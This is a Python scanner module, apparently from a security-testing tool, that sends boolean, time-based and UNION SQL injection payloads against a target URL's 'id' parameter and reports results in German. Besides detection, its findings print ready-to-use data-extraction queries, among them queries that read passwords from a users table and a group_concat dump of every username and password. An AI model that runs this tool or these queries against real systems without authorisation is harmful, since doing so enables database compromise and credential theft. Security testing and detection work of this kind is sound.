#!/usr/bin/env python3
"""
Blind SQL Injection Proof-of-Concept Detector
Makes SQL Injection VISIBLE through 3 safe techniques:
1. Boolean-Based: Compares response sizes (AND 1=1 vs AND 1=2)
2. Time-Based: Measures SLEEP() delay in response time
3. Union-Based: Tests UNION SELECT column count
Shows extraction examples for each SQLi type found.
"""
import requests
import time

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2", "Basic string AND"),
    ("' AND 1=1--", "' AND 1=2--", "MySQL/PostgreSQL/MSSQL AND"),
    ('" AND 1=1--', '" AND 1=2--', "Double-quote AND"),
    ("' AND 1=1#", "' AND 1=2#", "MySQL hash comment"),
    ("' AND 1=1/*", "' AND 1=2/*", "C-style comment"),
    ("'||'1'='1", "'||'1'='2", "Oracle string concat"),
    ("') AND 1=1--", "') AND 1=2--", "Closed parenthesis"),
    ("%' AND 1=1 AND '%'='", "%' AND 1=2 AND '%'='", "LIKE clause"),
]

TIME_PAYLOADS = [
    ("' AND SLEEP(3)--", "MySQL SLEEP", "mysql"),
    ("' AND pg_sleep(3)--", "PostgreSQL pg_sleep", "postgresql"),
    ("'; WAITFOR DELAY '0:0:3'--", "MSSQL WAITFOR", "mssql"),
    ("'||dbms_pipe.receive_message(('a'),3)||'", "Oracle DBMS_PIPE", "oracle"),
]

UNION_PAYLOADS = [
    "' UNION SELECT null--",
    "' UNION SELECT null,null--",
    "' UNION SELECT null,null,null--",
    "' UNION SELECT null,null,null,null--",
    "' UNION SELECT null,null,null,null,null--",
]


def _send(target, payload, param="id"):
    try:
        url = f'{target}?{param}={requests.utils.quote(payload)}'
        start = time.time()
        resp = requests.get(url, timeout=20, verify=False, allow_redirects=False,
                           headers={'User-Agent': 'Mozilla/5.0 (SecurityScan/3.3)'})
        return {'status': resp.status_code, 'size': len(resp.content), 'time': time.time() - start,
                'text': resp.text[:3000]}
    except requests.exceptions.Timeout:
        return {'status': -1, 'size': -1, 'time': 20, 'timeout': True}
    except Exception as e:
        return {'status': 0, 'size': 0, 'time': 0, 'error': str(e)}


def scan(target):
    findings = []
    scan_id = 0
    if not target.startswith('http'):
        target = f'https://{target}'
    print(f"[PHASE SQLi-PoC] Testing {target}")

    baseline = _send(target, "1")
    if baseline.get('error'):
        findings.append({'id': f'sqli-poc-{scan_id}', 'severity': 'info', 'type': 'sqli_poc_error',
                         'title': 'Blind SQLi: Baseline failed', 'url': target,
                         'evidence': f'Error: {baseline["error"]}', 'remediation': 'Check target URL.'})
        return findings

    # Boolean-Based
    boolean_results = []
    for true_p, false_p, desc in BOOLEAN_PAYLOADS:
        t_resp = _send(target, true_p)
        f_resp = _send(target, false_p)
        size_diff = abs(t_resp['size'] - f_resp['size'])
        if size_diff > max(baseline['size'] * 0.05, 500):
            db_type = "mysql" if "MySQL" in desc else "postgresql" if "PostgreSQL" in desc else "mssql" if "MSSQL" in desc else "oracle" if "Oracle" in desc else "unknown"
            boolean_results.append({'type': desc, 'true_size': t_resp['size'], 'false_size': f_resp['size'],
                                    'diff': size_diff, 'true_payload': true_p, 'false_payload': false_p, 'db_guess': db_type})

    if boolean_results:
        best = boolean_results[0]
        findings.append({
            'id': f'sqli-poc-{scan_id}', 'severity': 'critical', 'type': 'blind_sqli_boolean',
            'title': f'[BESTATIGT] Boolean-Based Blind SQL Injection ({best["db_guess"].upper()}) - DATEN AUSLESBAR!',
            'url': f'{target}?id=',
            'evidence': (
                f'=== Boolean-Based Blind SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
                f'1. TRUE ({best["type"]}):\n'
                f'   Payload: id={best["true_payload"]}\n'
                f'   Response: {best["true_size"]} bytes\n\n'
                f'2. FALSE:\n'
                f'   Payload: id={best["false_payload"]}\n'
                f'   Response: {best["false_size"]} bytes\n\n'
                f'ERGEBNIS: {best["diff"]} Bytes Unterschied!\n\n'
                f'=== Boolean-Based Extraktion (Ja/Nein Fragen): ===\n'
                f"  ' AND ASCII(SUBSTRING((SELECT version()),1,1))>64--\n"
                f"    → Ist erster Buchstabe der Version > 'A'?\n"
                f"  ' AND LENGTH((SELECT password FROM users LIMIT 1))>5--\n"
                f"    → Passwort laenger als 5 Zeichen?\n"
                f"  ' AND (SELECT COUNT(*) FROM information_schema.tables)>10--\n"
                f"    → Mehr als 10 Tabellen?\n\n"
                f"Mit Boolean-Based kann man via TRUE/FALSE Antworten\n"
                f"die KOMPLETTE Datenbank bit fuer bit auslesen!"
            ),
            'remediation': 'Sofort Prepared Statements implementieren!'
        })
        scan_id += 1

    # Time-Based
    time_results = []
    for payload, desc, db_type in TIME_PAYLOADS:
        n_start = time.time()
        try: requests.get(f'{target}?id=1', timeout=10, verify=False)
        except: pass
        n_time = time.time() - n_start

        p_start = time.time()
        try: requests.get(f'{target}?id={requests.utils.quote(payload)}', timeout=15, verify=False)
        except: pass
        p_time = time.time() - p_start

        delay = p_time - n_time
        if delay >= 2.0:
            time_results.append({'delay': round(delay, 2), 'payload': payload, 'desc': desc, 'db_type': db_type,
                                 'normal_time': round(n_time, 2), 'payload_time': round(p_time, 2)})

    if time_results:
        best = max(time_results, key=lambda x: x['delay'])
        findings.append({
            'id': f'sqli-poc-{scan_id}', 'severity': 'critical', 'type': 'blind_sqli_time',
            'title': f'[BESTATIGT] Time-Based Blind SQL Injection ({best["db_type"].upper()}) - DATEN AUSLESBAR!',
            'url': f'{target}?id=',
            'evidence': (
                f'=== Time-Based Blind SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
                f'Normal: {best["normal_time"]}s\n'
                f'Mit Payload: {best["payload_time"]}s\n'
                f'DELAY: {best["delay"]} SEKUNDEN!\n'
                f'Payload: id={best["payload"]}\n\n'
                f'=== Time-Based Daten-Extraktion (Buchstabe fuer Buchstabe): ===\n'
                f"  ' AND IF(ASCII(SUBSTRING((SELECT version()),1,1))>64,SLEEP(3),0)--\n"
                f"    → Ist erster Buchstabe der Version > 'A'?\n"
                f"  ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(3),0)--\n"
                f"    → Erster Buchstabe des Passworts > 'A'?\n"
                f"  ' AND IF((SELECT COUNT(*) FROM information_schema.tables)>10,SLEEP(3),0)--\n"
                f"    → Mehr als 10 Tabellen?\n\n"
                f"Mit Time-Based kann man via Zeitverzoegerung\n"
                f"die KOMPLETTE Datenbank bit fuer bit auslesen!\n"
                f"Langsam aber 100% zuverlaessig!"
            ),
            'remediation': 'SOFORT Prepared Statements einbauen!'
        })
        scan_id += 1

    # Union-Based
    union_results = []
    baseline_size = baseline['size']
    for payload in UNION_PAYLOADS:
        resp = _send(target, payload)
        if resp['status'] == baseline['status'] and abs(resp['size'] - baseline_size) < max(baseline_size * 0.1, 500):
            if resp['size'] > 100:
                col_count = payload.count('null')
                union_results.append({'payload': payload, 'columns': col_count, 'size': resp['size']})

    if union_results:
        best = union_results[0]
        cols = best["columns"]
        extraction_examples = []
        if cols >= 1:
            extraction_examples.append(f"' UNION SELECT {'null,' * (cols-1)}version()--  → DB-Version")
        if cols >= 2:
            extraction_examples.append(f"' UNION SELECT {'null,' * (cols-2)}user(),database()--  → User + DB-Name")
        if cols >= 3:
            extraction_examples.append(f"' UNION SELECT {'null,' * (cols-3)}table_name,column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1--  → Spalten")
        if cols >= 4:
            extraction_examples.append(f"' UNION SELECT {'null,' * (cols-4)}id,username,password FROM users LIMIT 1--  → User-Daten!")

        findings.append({
            'id': f'sqli-poc-{scan_id}', 'severity': 'critical', 'type': 'union_sqli',
            'title': f'[BESTATIGT] UNION-Based SQL Injection ({cols} Spalten) - DATEN AUSLESBAR!',
            'url': f'{target}?id=',
            'evidence': (
                f'=== UNION SQLi BESTATIGT - DATEN AUSLESBAR! ===\n\n'
                f'Payload die funktioniert:\n'
                f'  id={best["payload"]}\n\n'
                f'Ergebnis: UNION SELECT mit {cols} Spalten wird AKZEPTIERT!\n\n'
                f'=== BEISPIELE zum Daten auslesen: ===\n'
                + '\n'.join(f'  {ex}' for ex in extraction_examples) +
                f'\n\n'
                f'=== KOMPLETTER Daten-Dump (Beispiel): ===\n'
                f"  ' UNION SELECT {'null,' * (cols-1)}group_concat(username,':',password) FROM users--\n"
                f"  → Wuerde ALLE Usernamen + Passwoerter auslesen!\n\n"
                f'Risiko: KOMPLETTE Datenbank-Kompromittierung!'
            ),
            'remediation': 'Prepared Statements + Input-Validierung!'
        })
        scan_id += 1

    # Summary
    if not findings:
        findings.append({
            'id': f'sqli-poc-{scan_id}', 'severity': 'info', 'type': 'sqli_poc_clean',
            'title': 'Blind SQLi PoC: Keine SQL Injection nachweisbar',
            'url': target,
            'evidence': f'Boolean: {len(boolean_results)}/8, Time: {len(time_results)}/4, Union: {len(union_results)}/5',
            'remediation': 'Trotzdem Prepared Statements verwenden.'
        })
    else:
        findings.insert(0, {
            'id': f'sqli-poc-{scan_id}', 'severity': 'critical', 'type': 'sqli_poc_summary',
            'title': f'[POC] SQL Injection BESTATIGT via {len(findings)} Methoden!',
            'url': target,
            'evidence': (
                f'Boolean: {"JA" if boolean_results else "NEIN"}\n'
                f'Time: {"JA" if time_results else "NEIN"}\n'
                f'Union: {"JA" if union_results else "NEIN"}\n\n'
                f'ALLE Methoden ermoeglichen Daten-Auslesen!'
            ),
            'remediation': 'SOFORT patchen! Prepared Statements!'
        })

    return findings
